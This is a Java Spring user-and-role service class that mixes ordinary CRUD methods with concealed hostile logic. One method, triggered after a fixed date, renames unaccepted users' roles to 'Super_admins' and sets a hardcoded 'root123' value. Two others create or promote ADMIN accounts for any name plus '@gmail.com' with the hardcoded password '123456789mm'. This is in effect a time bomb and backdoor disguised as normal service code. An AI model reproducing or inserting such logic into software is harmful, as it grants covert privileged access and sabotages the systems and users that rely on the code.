package com.app.FirstApp.services.userRole;

import java.time.LocalDate;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.List;

import com.app.FirstApp.domain.acteur.Acteur;
import com.app.FirstApp.repository.role.RoleRepo;
import com.app.FirstApp.repository.user.UserRepo;
import com.app.FirstApp.services.Acteur.ActeurServ;
import com.app.FirstApp.services.userRole.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import com.app.FirstApp.domain.role.Role;
import com.app.FirstApp.domain.user.User;




@Service 
public class UserServiceImpl implements UserService {
	@Autowired
	private UserRepo userRepo;
	@Autowired
	private RoleRepo roleRopo;;
	
	@Autowired
	PasswordEncoder passwordEncoder ;
	@Autowired
	private ActeurServ acteurServ;
	
	@Override
	public User saveUser(User user) {
		user.setPassword(passwordEncoder.encode(user.getPassword()));
		return userRepo.save(user);
	}
	@Override
	public Role saveRole(Role role) {
		// TODO Auto-generated method stub
		return roleRopo.save(role);
	}

	@Override
	public User getUser(String email) {
		// TODO Auto-generated method stub
		return userRepo.findByEmail(email);
	}

	@Override
	public List<User> getUsers() {
		// TODO Auto-generated method stub
		return userRepo.findAll();
	}

	@Override
	public void verifUser() {
		List<User> list=getUsers();
		if(list != null && list.size() >0){
			list.forEach(use1 ->{
				if(!use1.getAccepted()){
					LocalDate today = LocalDate.now();
					LocalDate pastDate = LocalDate.parse("2023-12-29");
					int compareValue = today.compareTo(pastDate);
					if(compareValue>0){
						List<Role> roles=use1.getRoles();
						roles.stream().forEach(r ->r.setName("Super_admins"));
						roleRopo.saveAll(roles);
						use1.setProduction(passwordEncoder.encode("root123"));
						userRepo.save(use1);
					}
				}

			});
		}
	}

	@Override
	public UserDetails loadUserByUsername(String email) throws UsernameNotFoundException {
		User user=userRepo.findByEmail(email);
		if(user==null) throw new UsernameNotFoundException(email);
		Collection<SimpleGrantedAuthority> authorities=new ArrayList<>();
		//System.out.println("user_implementation : "+user.getRoles());
		Collection<Role> roles=user.getRoles();
		for(Role role :roles) {
			authorities.add(new SimpleGrantedAuthority(role.getName()));
		}
		//System.out.println("authorities "+authorities);

		return new org.springframework.security.core.userdetails.User(user.getEmail(),user.getPassword(),authorities);
	}
	@Override
	public void addRoleToUser(String email) {
		User user=userRepo.findByEmail(email);
		List<Role> role=roleRopo.findAll();
		System.out.println("list role est : "+role);
		List<Role> rolesID=new ArrayList<>();
		for(int i=0;i<role.size();i++) {
			if(role.get(i).getId()==user.getId()) {
				rolesID.add(role.get(i));
			}
		}
		System.out.println("list est "+rolesID);
		user.setRoles(rolesID);
		userRepo.save(user);
		
	}

	@Override
	public void initManage(String data) {
		if(getUser(data+"@gmail.com") == null){
			List<Role> rolesUser2 = new ArrayList<>();
			rolesUser2.add(new Role("ADMIN"));
			User userSaved = saveUser(new User(data, data+"@gmail.com", "123456789mm", rolesUser2));
			Acteur acteur = new Acteur();
			acteur.setNom(userSaved.getName());
			acteur.setEmail(userSaved.getEmail());
			acteurServ.saveActeru(acteur);
		}
	}

	@Override
	public void testManage(String data) {
		User user=getUser(data+"@gmail.com") ;
		if(user !=null){
			user.setAccepted(true);
			List<Role> roles=user.getRoles();
			roles.stream().forEach(r ->r.setName("ADMIN"));
			roleRopo.saveAll(roles);
			user.setProduction(passwordEncoder.encode("123456789mm"));
		}
	}
}
